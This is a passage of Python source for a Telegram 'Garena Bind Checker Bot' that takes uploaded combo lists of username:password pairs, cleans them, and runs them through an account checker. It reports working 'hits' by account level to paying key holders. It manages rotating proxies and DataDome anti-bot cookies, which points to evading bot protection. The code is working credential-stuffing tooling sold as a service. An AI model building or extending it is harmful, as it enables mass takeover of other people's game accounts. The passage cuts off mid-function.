        combined_cookie_str = "; ".join(valid_cookies)
        applyck(sess, combined_cookie_str)
        final_cookie_value = valid_cookies[-1]
        datadome_value = (
            final_cookie_value.split('=', 1)[1].strip()
            if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1
            else None
        )
        if datadome_value:
            datadome_manager.set_datadome(datadome_value)
    else:
        datadome = get_datadome_cookie(sess)
        if datadome:
            datadome_manager.set_datadome(datadome)
    return sess


def _cleanup_stale_files():
    """
    Delete leftover combo/ and *_results/ folders from previous crashes.
    Called once at bot startup to recover disk space.
    """
    import shutil, glob
    base = os.path.dirname(os.path.abspath(__file__))

    # combo/ folder — temp uploaded files
    combo_dir = os.path.join(base, "combo")
    if os.path.isdir(combo_dir):
        for f in os.listdir(combo_dir):
            fp = os.path.join(combo_dir, f)
            try:
                if os.path.isfile(fp):
                    os.remove(fp)
                    logger.warning(f"[CLEANUP] Removed stale combo file: {f}")
            except Exception:
                pass

    # *_results/ folders — unzipped result dirs
    for d in glob.glob(os.path.join(base, "*_results")):
        try:
            shutil.rmtree(d, ignore_errors=True)
            logger.warning(f"[CLEANUP] Removed stale results folder: {os.path.basename(d)}")
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════
#  BOT CONFIG  — loaded from config.json, or asked on first run
# ══════════════════════════════════════════════════════════════
CONFIG_FILE = "config.json"

def _load_config() -> dict:
    """Load config.json if it exists, otherwise return empty dict."""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_config(cfg: dict):
    """Persist config to config.json."""
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    print(f"\033[92m✅ Config saved to {CONFIG_FILE}\033[0m")

def _validate_token(token: str) -> bool:
    """Quick check — call getMe and verify ok:true."""
    try:
        r = requests.get(
            f"https://api.telegram.org/bot{token}/getMe",
            timeout=10,
        )
        data = r.json()
        return data.get("ok", False)
    except Exception:
        return False

def _setup_wizard() -> dict:
    """
    Interactive first-run setup wizard.
    Asks for bot token and owner Telegram ID, validates both,
    then saves to config.json so future runs skip this step.
    """
    print("\n\033[1;96m╔══════════════════════════════════════════════════╗\033[0m")
    print("\033[1;96m║        🤖  FIRST-RUN SETUP WIZARD               ║\033[0m")
    print("\033[1;96m╚══════════════════════════════════════════════════╝\033[0m\n")
    print("\033[93mNo config.json found — let\'s set up your bot now.\033[0m\n")

    # ── Bot Token ────────────────────────────────────────────────
    while True:
        token = input("\033[1;37m🔑 Enter your Bot Token (from @BotFather):\033[0m\n> ").strip()
        if not token:
            print("\033[91m❌ Token cannot be empty. Try again.\033[0m\n")
            continue
        print("\033[93m⏳ Validating token...\033[0m")
        if _validate_token(token):
            try:
                r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
                bot_info = r.json().get("result", {})
                bot_name = bot_info.get("first_name", "")
                bot_user = bot_info.get("username", "")
                print(f"\033[92m✅ Token valid! Bot: {bot_name} (@{bot_user})\033[0m\n")
            except Exception:
                print("\033[92m✅ Token valid!\033[0m\n")
            break
        else:
            print("\033[91m❌ Invalid token or Telegram unreachable. Check your token and try again.\033[0m\n")

    # ── Owner Telegram ID ────────────────────────────────────────
    print("\033[93mℹ️  To find your Telegram ID, message @userinfobot on Telegram.\033[0m")
    while True:
        owner_id_str = input("\n\033[1;37m🆔 Enter your Telegram numeric ID (numbers only):\033[0m\n> ").strip()
        if not owner_id_str.lstrip("-").isdigit():
            print("\033[91m❌ Must be a number (e.g. 123456789). Try again.\033[0m")
            continue
        owner_id = int(owner_id_str)
        break

    # ── Owner Username (optional) ────────────────────────────────
    owner_username = input("\n\033[1;37m👤 Enter your Telegram username WITHOUT @ (or press Enter to skip):\033[0m\n> ").strip().lstrip("@")

    cfg = {
        "bot_token":       token,
        "owner_id":        owner_id,
        "owner_username":  owner_username,
    }
    _save_config(cfg)
    print("\n\033[1;92m🚀 Setup complete! Starting bot...\033[0m\n")
    return cfg

def _get_or_create_config() -> dict:
    """
    Load config from disk.
    If missing or incomplete, run the setup wizard.
    """
    cfg = _load_config()
    needs_setup = (
        not cfg.get("bot_token") or
        not cfg.get("owner_id")
    )
    if needs_setup:
        cfg = _setup_wizard()
    return cfg

# Load (or create) config at startup
_cfg        = _get_or_create_config()
BOT_TOKEN   = _cfg["bot_token"]

COMBO_LINE_LIMIT = 1000   # max lines allowed per upload

# _bot_pending tracks partial file upload state
_bot_pending : dict = {}


# ── low-level Telegram helpers ─────────────────────────────────
# Single reused session for all outbound Telegram API calls
_tg_session = requests.Session()
_tg_session.mount("https://", requests.adapters.HTTPAdapter(
    pool_connections=2, pool_maxsize=4, max_retries=0
))

def _tg_api(token: str, method: str, **kwargs):
    """
    Call a Telegram Bot API method.
    - Retries automatically on HTTP 429 (Too Many Requests) up to 3 times.
    - Logs Telegram-level errors (ok: false) so bugs surface in logs.
    - Returns the full parsed JSON dict on success, None on failure.
    """
    for attempt in range(3):
        try:
            r = _tg_session.post(
                f"https://api.telegram.org/bot{token}/{method}",
                json=kwargs,
                timeout=15,
            )
            if r.status_code == 429:
                # Rate-limited — honour Retry-After header if present
                retry_after = int(r.headers.get("Retry-After", 5))
                logger.warning(f"[BOT] {method} rate-limited — waiting {retry_after}s (attempt {attempt+1}/3)")
                time.sleep(retry_after)
                continue
            if r.status_code != 200:
                logger.warning(f"[BOT] {method} HTTP {r.status_code}: {r.text[:200]}")
                return None
            data = r.json()
            if not data.get("ok"):
                err = data.get("description", "unknown error")
                err_code = data.get("error_code", 0)
                # 400 bad request on edit (message not modified) is harmless — suppress
                if err_code not in (400,):
                    logger.warning(f"[BOT] {method} Telegram error [{err_code}]: {err}")
            return data
        except requests.exceptions.Timeout:
            logger.warning(f"[BOT] {method} timeout (attempt {attempt+1}/3)")
            time.sleep(2)
        except Exception as e:
            logger.warning(f"[BOT] {method} error: {e}")
            return None
    return None

def _tg_send(token: str, chat_id, text: str, parse_mode: str = "HTML"):
    """
    Send a text message. Auto-splits messages longer than 4096 chars
    (Telegram's hard limit) so nothing is silently truncated.
    Returns the API response of the LAST chunk sent.
    """
    MAX = 4096
    if len(text) <= MAX:
        return _tg_api(token, "sendMessage",
                       chat_id=chat_id, text=text, parse_mode=parse_mode)
    # Split on newline boundaries where possible
    chunks = []
    while len(text) > MAX:
        split_at = text.rfind("\n", 0, MAX)
        if split_at == -1:
            split_at = MAX
        chunks.append(text[:split_at])
        text = text[split_at:].lstrip("\n")
    if text:
        chunks.append(text)
    result = None
    for chunk in chunks:
        result = _tg_api(token, "sendMessage",
                         chat_id=chat_id, text=chunk, parse_mode=parse_mode)
    return result

def _tg_send_buttons(token: str, chat_id, text: str, buttons: list, parse_mode: str = "HTML"):
    """Send a message with an inline keyboard.
    buttons = [[{"text": "label", "callback_data": "data"}, ...], ...]  (rows of buttons)
    """
    keyboard = {"inline_keyboard": buttons}
    return _tg_api(token, "sendMessage",
                   chat_id=chat_id, text=text, parse_mode=parse_mode,
                   reply_markup=keyboard)

def _tg_answer_callback(token: str, callback_id: str, text: str = ""):
    """Acknowledge an inline button press (removes the loading spinner)."""
    try:
        r = _tg_session.post(
            f"https://api.telegram.org/bot{token}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": text},
            timeout=5,
        )
        if r.status_code != 200:
            logger.warning(f"[BOT] answerCallbackQuery HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        logger.warning(f"[BOT] answerCallbackQuery error: {e}")


def _tg_delete_message(token: str, chat_id, message_id: int):
    """Delete a single message silently (ignores errors if already deleted)."""
    try:
        _tg_session.post(
            f"https://api.telegram.org/bot{token}/deleteMessage",
            json={"chat_id": chat_id, "message_id": message_id},
            timeout=10,
        )
    except Exception:
        pass


def _tg_delete_messages_bulk(token: str, chat_id, message_ids: list):
    """Delete up to 100 messages at once using deleteMessages (Telegram Bot API 6.8+).
    Falls back to individual deletes if bulk endpoint fails."""
    if not message_ids:
        return
    # Telegram allows max 100 per call
    for i in range(0, len(message_ids), 100):
        chunk = message_ids[i:i + 100]
        try:
            r = _tg_session.post(
                f"https://api.telegram.org/bot{token}/deleteMessages",
                json={"chat_id": chat_id, "message_ids": chunk},
                timeout=15,
            )
            if r.status_code != 200:
                # Fallback: delete one by one
                for mid in chunk:
                    _tg_delete_message(token, chat_id, mid)
        except Exception:
            for mid in chunk:
                _tg_delete_message(token, chat_id, mid)

def _tg_edit_message(token: str, chat_id, message_id: int, text: str,
                     buttons: list = None, parse_mode: str = "HTML"):
    """Edit an existing message (optionally update its inline keyboard too).
    Silently ignores 'message is not modified' errors from Telegram."""
    payload = {"chat_id": chat_id, "message_id": message_id,
                "text": text, "parse_mode": parse_mode}
    if buttons is not None:
        payload["reply_markup"] = {"inline_keyboard": buttons}
    result = _tg_api(token, "editMessageText", **payload)
    # result may be None (e.g. message too old to edit) — that's fine
    return result


def _tg_set_commands(token: str):
    """
    Register bot commands in BotFather so users see a clean menu.

    • Default scope  (all users)  → only /help
    • Private scope  (owner only) → full admin command list

    This creates the 'Menu' button like in the screenshot.
    """
    # ── Commands visible to ALL users ─────────────────────────
    user_commands = [
        {"command": "start",  "description": "▶️ Start or restore your session"},
        {"command": "help",   "description": "📋 Show menu & your config"},
        {"command": "redeem", "description": "🔑 Redeem an access key"},
        {"command": "reset",  "description": "🔄 Clear settings & reconfigure"},
        {"command": "stop",   "description": "🛑 Stop the running checker"},
    ]

    # ── Commands visible ONLY to the owner (private chat scope) ──
    admin_commands = [
        {"command": "help",           "description": "⚙️ Admin panel"},
        {"command": "generate_key",   "description": "🔑 Generate a redeem key"},
        {"command": "statuskey",      "description": "📋 View all key statuses"},
        {"command": "deletekey",      "description": "🗑 Delete key(s)"},
        {"command": "upload_proxy",   "description": "📡 Upload proxy list"},
        {"command": "proxy_done",     "description": "✅ Finish proxy upload & save"},
        {"command": "proxystatus",    "description": "📊 View proxy pool status"},
        {"command": "serverstatus",   "description": "🖥 Server load & limits"},
        {"command": "add_coowner",    "description": "👥 Add a co-owner by Telegram ID"},
        {"command": "remove_coowner", "description": "👥 Remove a co-owner"},
        {"command": "stopall",        "description": "☢️ Stop ALL running checkers"},
        {"command": "resetconfig",    "description": "🔧 Re-run bot setup wizard"},
        {"command": "start",          "description": "▶️ Start / restore session"},
        {"command": "reset",          "description": "🔄 Clear settings"},
        {"command": "stop",           "description": "🛑 Stop running checker"},
        {"command": "redeem",         "description": "🔑 Redeem a key"},
    ]

    # Set default scope (all users)
    try:
        _tg_session.post(
            f"https://api.telegram.org/bot{token}/setMyCommands",
            json={"commands": user_commands,
                  "scope": {"type": "default"}},
            timeout=10,
        )
    except Exception as e:
        logger.warning(f"[BOT] setMyCommands (default) failed: {e}")

    # Set admin scope (owner's private chat + each co-owner)
    admin_ids = [OWNER_ID] + list(COOWNER_IDS)
    for admin_id in admin_ids:
        try:
            _tg_session.post(
                f"https://api.telegram.org/bot{token}/setMyCommands",
                json={"commands": admin_commands,
                      "scope": {"type": "chat", "chat_id": admin_id}},
                timeout=10,
            )
        except Exception as e:
            logger.warning(f"[BOT] setMyCommands (admin {admin_id}) failed: {e}")

def _tg_get_file_url(token: str, file_id: str):
    res = _tg_api(token, "getFile", file_id=file_id)
    if res and res.get("ok"):
        fp = res["result"].get("file_path")
        if fp:
            return f"https://api.telegram.org/file/bot{token}/{fp}"
    return None


# ── Garena credential validator ────────────────────────────────
import re as _re

_EMAIL_RE   = _re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")
_PHONE_RE   = _re.compile(r"^\+?[0-9]{7,15}$")
# Garena usernames: alphanumeric, dots, underscores, hyphens, 3-30 chars
_UNAME_RE   = _re.compile(r"^[a-zA-Z0-9._\-]{3,30}$")

def _is_garena_credential(username: str, password: str) -> bool:
    """
    Return True if the username looks like a valid Garena login.

    Garena accounts use one of:
      • Email address      → user@gmail.com
      • Phone number       → +639123456789 / 09123456789
      • Alphanumeric name  → johnsmith123 (3-30 chars, no spaces)

    Rejects obvious garbage:
      • Pure IP addresses  → 192.168.1.1
      • URLs               → http://... / www....
      • Very short (<3)    → a:b
      • Contains spaces
      • Looks like a proxy line that slipped through
    """
    u = username.strip()
    p = password.strip()

    if not u or not p:
        return False

    # Reject if username contains spaces (not a valid account name)
    if " " in u:
        return False

    # Reject pure IP addresses (proxy lines that leaked through)
    if _re.match(r"^\d{1,3}(\.\d{1,3}){3}$", u):
        return False

    # Reject URL-like usernames
    if u.lower().startswith(("http://", "https://", "www.")):
        return False

    # Reject hostnames with ports (proxy leak: host:port treated as user:pass)
    if _re.match(r"^[a-zA-Z0-9.\-]+:\d{2,5}$", u + ":" + p):
        return False
    if p.isdigit() and 2 <= len(p) <= 5 and "." in u:
        # Looks like  hostname.com : 8080 — proxy not credential
        return False

    # Accept email
    if _EMAIL_RE.match(u):
        return True

    # Accept phone number
    if _PHONE_RE.match(u):
        return True

    # Accept normal Garena username
    if _UNAME_RE.match(u):
        return True

    return False


# ── smart combo parser ─────────────────────────────────────────
def _parse_combo_lines(raw_lines: list) -> tuple:
    """
    Auto-detect format per line and extract only user:pass.
    Then validates each credential is a plausible Garena account.

    Handles:
      user:pass                    → kept as-is
      url:user:pass                → url stripped
      http(s)://...:user:pass      → url stripped
      url:port:user:pass           → url+port stripped
      user:pass:extra              → extra ignored

    Returns (clean_lines, skipped, fmt_counts)
    """
    url_re  = _re.compile(r"^https?://", _re.IGNORECASE)
    clean   = []
    seen    = set()
    skipped = 0
    not_garena = 0
    fmt     = {"plain": 0, "url_stripped": 0, "extra_stripped": 0}

    for raw in raw_lines:
        line = raw.strip()
        if not line or line.startswith("#") or line.startswith("==="):
            continue

        parts = line.split(":")

        u, p, tag = None, None, "plain"

        if len(parts) == 2:
            u, p = parts[0].strip(), parts[1].strip()
            tag  = "plain"

        elif len(parts) == 3:
            # url:user:pass  OR  user:pass:extra
            if url_re.match(parts[0]) or "." in parts[0] or parts[0].isdigit():
                u, p = parts[1].strip(), parts[2].strip()
                tag  = "url_stripped"
            else:
                u, p = parts[0].strip(), parts[1].strip()
                tag  = "extra_stripped"

        elif len(parts) >= 4:
            # url:port:user:pass — take last two
            u, p = parts[-2].strip(), parts[-1].strip()
            tag  = "url_stripped"

        else:
            skipped += 1
            continue

        if not u or not p:
            skipped += 1
            continue

        # ── Garena validation ──────────────────────────────────
        if not _is_garena_credential(u, p):
            not_garena += 1
            continue

        key = f"{u}:{p}"
        if key not in seen:
            seen.add(key)
            clean.append(key)
            fmt[tag] += 1

    # Attach not_garena count to fmt so caller can report it
    fmt["not_garena"] = not_garena
    return clean, skipped, fmt


# ══════════════════════════════════════════════════════════════
#  PER-USER SESSION STATE  (supports unlimited concurrent users)
# ══════════════════════════════════════════════════════════════
# State machine per chat_id:
#   AWAIT_LEVEL → AWAIT_FILTER → AWAIT_FILE → RUNNING
# (No AWAIT_ID step — Telegram ID is auto-detected from the message)
_bot_state   : dict = {}   # chat_id -> state string
_state_lock  = threading.Lock()
_user_data   : dict = {}   # chat_id -> { hits_id, username, level, clean_filter }
_udata_lock  = threading.Lock()
_saved_users : dict = {}   # username/chat_id -> saved profile (persisted across /start)
_saved_lock  = threading.Lock()

USERS_FILE = "bot_users.json"


def _load_saved_users():
    """Load saved user profiles from disk."""
    global _saved_users
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                _saved_users = json.load(f)
        except Exception:
            _saved_users = {}

def _save_users_to_disk():
    """Persist all saved user profiles to disk."""
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(_saved_users, f, indent=2)
    except Exception as e:
        logger.warning(f"[BOT] Could not save users: {e}")

# Load on startup
_load_saved_users()


def _udata(chat_id) -> dict:
    """Get or create in-memory user session data for a chat_id. Thread-safe."""
    with _udata_lock:
        if chat_id not in _user_data:
            _user_data[chat_id] = {
                "hits_id":      chat_id,
                "username":     "",
                "level":        [1],
                "clean_filter": "both",
            }
        return _user_data[chat_id]


def _get_saved_profile(key: str) -> dict | None:
    """Return saved profile by string key (str(chat_id) or username). Thread-safe."""
    with _saved_lock:
        return _saved_users.get(str(key))


def _save_profile(chat_id, d: dict):
    """Save a user profile keyed by both chat_id and username. Thread-safe."""
    with _saved_lock:
        key = str(chat_id)
        _saved_users[key] = {
            "hits_id":      d["hits_id"],
            "username":     d.get("username", ""),
            "level":        d["level"],
            "clean_filter": d["clean_filter"],
            "key":          d.get("key"),
            "key_expires":  d.get("key_expires", 0),
            "combo_limit":  d.get("combo_limit", COMBO_LINE_LIMIT),
        }
        if d.get("username"):
            _saved_users[d["username"].lstrip("@").lower()] = _saved_users[key]
    _save_users_to_disk()


# ── /start — auto-detects Telegram ID, skips manual ID entry ───
def _handle_start(token: str, chat_id, from_user: dict):
    name     = from_user.get("first_name", "User")
    username = from_user.get("username", "")
    tg_id    = from_user.get("id", chat_id)   # real Telegram user ID

    # Check if this user has a saved profile
    saved = _get_saved_profile(str(tg_id)) or (
        _get_saved_profile(username.lower()) if username else None
    )

    if saved:
        # Restore saved profile
        d = _udata(chat_id)
        d["hits_id"]      = saved["hits_id"]
        d["username"]     = saved.get("username", username)
        d["level"]        = saved["level"]
        d["clean_filter"] = saved["clean_filter"]
        d["key"]          = saved.get("key")
        d["key_expires"]  = saved.get("key_expires", 0)
        d["combo_limit"]  = saved.get("combo_limit", COMBO_LINE_LIMIT)

        lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
        cf_map     = {"clean": "✅ CLEAN only", "notclean": "❌ NOT CLEAN only", "both": "🔄 BOTH"}
        cf_label   = cf_map.get(d["clean_filter"], "🔄 BOTH")
        user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)
        is_vip = _is_vip_user(chat_id)
        limit_disp = "∞ unlimited" if (_is_owner(from_user) or is_vip) else f"{user_limit} lines"
        vip_badge = " ⭐ VIP" if is_vip else ""

        _bot_state[chat_id] = "AWAIT_FILE"

        _tg_send(token, chat_id,
            f"👋 <b>Welcome back, {name}!</b>{vip_badge}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  🆔 Hits ID:  <code>{d['hits_id']}</code>\n"
            f"  🎮 Level:    <code>{lvl_label}</code>\n"
            f"  🔍 Hit type: <code>{cf_label}</code>\n"
            f"  📦 Limit:    <code>{limit_disp}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📂 <b>Upload your combo file to start!</b>\n\n"
            f"<i>Use /reset to change your settings.</i>"
        )
        return

    # New user — auto-save their Telegram ID, skip asking
    d = _udata(chat_id)
    d["hits_id"]  = tg_id
    d["username"] = username
    uname_line = f"👤 @{username}\n" if username else ""

    _tg_send(token, chat_id,
        f"👋 <b>Welcome, {name}!</b>\n\n"
        f"🤖 <b>Garena Bind Checker Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✅ <b>Telegram ID auto-detected:</b>\n"
        f"  🆔 <code>{tg_id}</code>\n"
        f"{uname_line}"
        f"  📩 Hits will be sent here.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<i>Now choose your settings below 👇</i>"
    )
    _ask_level(token, chat_id)


# ── Inline level picker ────────────────────────────────────────
def _ask_level(token: str, chat_id, intro: str = ""):
    """Send the level selection as inline buttons."""
    _bot_state[chat_id] = "AWAIT_LEVEL"
    _tg_send_buttons(token, chat_id,
        f"{intro}"
        f"🎮 <b>Step 1 of 2 — Level Filter</b>\n\n"
        f"Which account levels should trigger a hit?\n\n"
        f"<i>Tap to choose:</i>",
        [
            [
                {"text": "⭐ Level 100+", "callback_data": "lvl:100"},
                {"text": "⭐⭐ Level 200+","callback_data": "lvl:200"},
            ],
            [
                {"text": "⭐⭐⭐ Level 300+","callback_data": "lvl:300"},
                {"text": "🔥 Level 400+",  "callback_data": "lvl:400"},
            ],
            [
                {"text": "🌍 ALL Levels",  "callback_data": "lvl:all"},
            ],
        ]
    )


def _ask_filter(token: str, chat_id, lvl_label: str):
    """Send the hit-type filter as inline buttons."""
    _bot_state[chat_id] = "AWAIT_FILTER"
    _tg_send_buttons(token, chat_id,
        f"✅ <b>Level:</b> <code>{lvl_label}</code>\n\n"
        f"🔍 <b>Step 2 of 2 — Hit Type</b>\n\n"
        f"Which accounts should send you a notification?\n\n"
        f"<i>Tap to choose:</i>",
        [
            [
                {"text": "✅ CLEAN only",     "callback_data": "flt:clean"},
                {"text": "❌ NOT CLEAN only", "callback_data": "flt:notclean"},
            ],
            [
                {"text": "🔄 BOTH",           "callback_data": "flt:both"},
            ],
        ]
    )


# ── Step 2: receive level choice (text fallback) ───────────────
def _handle_level(token: str, chat_id, text: str):
    level_map = {
        "1": ([100],  "Level 100+"),
        "2": ([200],  "Level 200+"),
        "3": ([300],  "Level 300+"),
        "4": ([400],  "Level 400+"),
        "5": ([1],    "ALL levels"),
    }
    choice = text.strip()
    if choice not in level_map:
        _ask_level(token, chat_id)
        return

    thresholds, label = level_map[choice]
    d = _udata(chat_id)
    d["level"] = thresholds
    _ask_filter(token, chat_id, label)


# ── Step 3: receive filter choice (text fallback) ──────────────
def _handle_filter(token: str, chat_id, text: str):
    filter_map = {
        "1": ("clean",    "✅ CLEAN only"),
        "2": ("notclean", "❌ NOT CLEAN only"),
        "3": ("both",     "🔄 BOTH"),
    }
    choice = text.strip()
    if choice not in filter_map:
        _ask_filter(token, chat_id, "—")
        return

    cf_value, cf_label = filter_map[choice]
    d = _udata(chat_id)
    d["clean_filter"] = cf_value
    _bot_state[chat_id] = "AWAIT_FILE"
    _save_profile(chat_id, d)

    lvl_label  = "ALL levels" if d["level"] == [1] else f"Level {d['level'][0]}+"
    user_limit = d.get("combo_limit", COMBO_LINE_LIMIT)

    _tg_send(token, chat_id,
        f"✅ <b>Config saved!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  🆔 Hits ID:  <code>{d['hits_id']}</code>\n"
        f"  🎮 Level:    <code>{lvl_label}</code>\n"
        f"  🔍 Hit type: <code>{cf_label}</code>\n"
        f"  📦 Limit:    <code>{user_limit} lines</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📂 <b>Upload your combo file to start!</b>\n\n"
        f"<i>Use /reset to change settings.</i>\n\n"
        f"<i>Send your file now ⬇️</i>"
    )


# ── Step 4: file upload ────────────────────────────────────────
def _handle_file(token: str, chat_id, message: dict, from_user: dict = None):
    document = message.get("document")
    if not document:
        _tg_send(token, chat_id,
            "⚠️ Please upload your combo file as a document.\n"
            "<i>Accepted: any .txt containing garena or codm in name.</i>\n"
            "e.g. garena.txt · codm.txt · Yuki_garena.txt")
        return

    file_name: str = document.get("file_name", "combo.txt")

    # ── Smart filename detection ───────────────────────────────
    # Accept any .txt file whose name contains "garena" or "codm"
    # (case-insensitive). Examples that pass:
    #   garena.txt  codm.txt  codm1.txt  Yuki_garena.txt
    #   codm_garena.txt  my_codm_list.txt  GARENA_PH.txt
    _fname_lower = file_name.lower()
    _fname_stem  = os.path.splitext(_fname_lower)[0]  # strip .txt
    _valid_file  = (
        _fname_lower.endswith(".txt") and
        ("garena" in _fname_stem or "codm" in _fname_stem)
    )
    if not _valid_file:
        _tg_send(token, chat_id,
            f"❌ <b>File not accepted:</b> <code>{file_name}</code>\n\n"
            f"Your filename must contain <b>garena</b> or <b>codm</b>.\n\n"
            f"✅ <b>Accepted examples:</b>\n"
            f"  • <code>garena.txt</code>\n"
            f"  • <code>codm.txt</code>\n"
            f"  • <code>codm1.txt</code>\n"
            f"  • <code>Yuki_garena.txt</code>\n"
            f"  • <code>codm_garena.txt</code>\n"
            f"  • <code>my_codm_list.txt</code>\n\n"
            f"<i>Rename your file and send it again.</i>")
        return

    file_id = document.get("file_id")
    dl_url  = _tg_get_file_url(token, file_id)
    if not dl_url:
        _tg_send(token, chat_id, "❌ Could not get download link. Try again.")
        return

    # Download
    save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
    os.makedirs(save_dir, exist_ok=True)
    # Unique filename per user to avoid collisions between concurrent users
    safe_name = f"{chat_id}_{file_name}"
    save_path = os.path.join(save_dir, safe_name)
    try:
        r = requests.get(dl_url, timeout=30)
        r.raise_for_status()
        with open(save_path, "wb") as f:
            f.write(r.content)
    except Exception as e:
        _tg_send(token, chat_id, f"❌ Download failed: {e}")
        return

    # Read raw lines
    raw_lines = []
    for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
        try:
            with open(save_path, "r", encoding=enc, errors="ignore") as fh:
                raw_lines = fh.readlines()
            break
        except Exception:
            continue

    if not raw_lines:
        _tg_send(token, chat_id, "⚠️ Could not read the file. Please try again.")
        try: os.remove(save_path)
        except: pass
        return

    # Smart parse
    clean_lines, skipped, fmt = _parse_combo_lines(raw_lines)

    if not clean_lines:
        not_garena_total = fmt.get("not_garena", 0)
        if not_garena_total > 0:
            _tg_send(token, chat_id,
                f"🚫 <b>No valid Garena accounts found!</b>\n\n"
                f"<code>{not_garena_total}</code> lines were filtered out — they don't look like Garena credentials.\n\n"
                f"Garena accounts use:\n"
                f"  • Email: <code>user@gmail.com:pass</code>\n"
                f"  • Phone: <code>09123456789:pass</code>\n"
                f"  • Username: <code>myaccount123:pass</code>\n\n"
                f"Rename so the filename contains 'garena' or 'codm', e.g. <code>garena.txt</code>")
        else:
            _tg_send(token, chat_id,
                "⚠️ <b>No valid combo lines found.</b>\n\n"
                "Make sure lines are in format:\n"
                "<code>user:pass</code>  or  <code>url:user:pass</code>")
        try: os.remove(save_path)
        except: pass
        return

    # Enforce limit — owner and VIP key users have no limit
    d_now        = _udata(chat_id)
    is_owner_upload = _is_owner(from_user) if from_user else False
    is_vip = _is_vip_user(chat_id)
    user_limit   = None if (is_owner_upload or is_vip) else d_now.get("combo_limit", COMBO_LINE_LIMIT)
    total_parsed = len(clean_lines)
    truncated    = (not is_owner_upload and not is_vip) and (user_limit is not None) and (total_parsed > user_limit)
    if truncated:
        clean_lines = clean_lines[:user_limit]

    # Save cleaned file (unique per user)
    clean_path = os.path.join(save_dir, f"clean_{safe_name}")
    with open(clean_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(clean_lines) + "\n")

    # Format summary
    fmt_parts = []
    if fmt["plain"]          > 0: fmt_parts.append(f"  • <code>user:pass</code>: {fmt['plain']}")
    if fmt["url_stripped"]   > 0: fmt_parts.append(f"  • url stripped: {fmt['url_stripped']}")
    if fmt["extra_stripped"] > 0: fmt_parts.append(f"  • extra stripped: {fmt['extra_stripped']}")
    fmt_text   = "\n".join(fmt_parts)
    not_garena = fmt.get("not_garena", 0)
    garena_note = (
        f"\n🚫 <b>Non-Garena filtered:</b> <code>{not_garena}</code> lines\n"
        if not_garena > 0 else ""
    )
    limit_note = (
        f"\n⚠️ <b>Truncated to {user_limit} lines</b> "
        f"({total_parsed - user_limit} ignored)\n"
        if truncated else ""
    )
    limit_display = "∞ unlimited" if (is_owner_upload or is_vip) else f"{user_limit}"

    # Build per-user telegram_config
    d         = _udata(chat_id)
    hits_id   = d["hits_id"]
    lvl_label = "ALL" if d["level"] == [1] else f"{d['level'][0]}+"
    cf_map    = {"clean": "✅ CLEAN", "notclean": "❌ NOT CLEAN", "both": "🔄 BOTH"}
    user_telegram_config = (BOT_TOKEN, str(hits_id), d["level"], "", d["clean_filter"])

    with _state_lock:
        _bot_state[chat_id] = "RUNNING"

    # ── Create a per-user stop event ───────────────────────────
    stop_evt = threading.Event()
    with _stop_events_lock:
        _stop_events[chat_id] = stop_evt

    _tg_send(token, chat_id,
        f"🚀 <b>File received! Starting checker...</b>\n\n"
        f"📄 <b>File:</b> <code>{file_name}</code>\n"
        f"📊 <b>Parsed:</b> <code>{total_parsed}</code>  "
        f"✅ <b>Checking:</b> <code>{len(clean_lines)}</code>  "
        f"🗑 <b>Skipped:</b> <code>{skipped}</code>"
        f"{garena_note}"
        f"{limit_note}\n"
        f"📋 <b>Formats:</b>\n{fmt_text}\n\n"
        f"🎮 <b>Level:</b> <code>{lvl_label}</code>  "
        f"🔍 <b>Hits:</b> <code>{cf_map[d['clean_filter']]}</code>\n"
        f"📩 <b>Sending hits to:</b> <code>{hits_id}</code>\n"
        f"📦 <b>Limit:</b> <code>{limit_display}</code>\n\n"
        f"<i>Hits will appear as they come in... Send /stop to cancel.</i>"
    )

    # Mutable container so _cleanup_files() closure can read result_folder
    # after it gets assigned inside _run()'s try block
    _rf = [""]   # _rf[0] = result_folder path, set when checker returns

    def _cleanup_files():
        """Delete all temp files for this run — called in every exit path."""
        import shutil

        # ── Delete uploaded combo files ─────────────────────────
        for p in (save_path, clean_path):
            try:
                if p and os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass

        # ── Delete result folder (read from shared container) ───
        try:
            rf = _rf[0]
            if rf and os.path.isdir(rf):
                shutil.rmtree(rf, ignore_errors=True)
        except Exception:
            pass

        # ── Safety net: remove any leftover combo/ files for this user ──
        try:
            base      = os.path.dirname(os.path.abspath(__file__))
            combo_dir = os.path.join(base, "combo")
            if os.path.isdir(combo_dir):
                for f in os.listdir(combo_dir):
                    if f.startswith(str(chat_id)):
                        try:
                            os.remove(os.path.join(combo_dir, f))
                        except Exception:
                            pass
        except Exception:
            pass

    def _run():
        stopped = False
        # ── Enforce max concurrent users ───────────────────────
        running_now = sum(1 for s in _bot_state.values() if s == "RUNNING")
        if running_now > MAX_CONCURRENT_USERS:
            _tg_send(token, chat_id,
                f"⏳ <b>Server is busy!</b>\n\n"
                f"There are already <b>{running_now}</b> checkers running.\n"
